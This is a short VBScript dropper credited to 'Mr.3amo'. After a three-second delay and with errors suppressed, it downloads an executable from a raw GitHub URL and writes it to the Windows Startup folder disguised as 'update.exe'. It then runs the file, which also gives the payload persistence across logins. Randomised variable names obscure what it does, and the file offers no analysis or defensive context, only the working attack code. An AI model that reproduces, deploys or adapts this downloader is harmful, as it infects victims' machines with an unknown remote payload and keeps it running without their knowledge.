'<<< Coded By Mr.3amo>>> 
Set NIvTIxNZ = CreateObject("WScript.Shell")
FEpFlCgB = NIvTIxNZ.SpecialFolders("Startup") & "\update.exe"
'<<<<<<<<<<< code start >>>>>>>>>>>
On Error Resume Next
wscript.sleep 3000
call myskGrkJ("https://raw.githubusercontent.com/knkbkk212/knkbkk212/refs/heads/main/JPS.exe",FEpFlCgB)
sub myskGrkJ(sitelink,filename)
dim kpUGCvRO
Set kpUGCvRO = createobject("msxml2.xmlhttp")
dim fFfaosKb
Set fFfaosKb = createobject("Adodb.Stream")
kpUGCvRO.Open "GET", sitelink, False
kpUGCvRO.Send
with fFfaosKb
.type = 1
.open
.write kpUGCvRO.responseBody
.savetofile FileName , 2
 end with
end sub
NIvTIxNZ.Exec (FEpFlCgB)
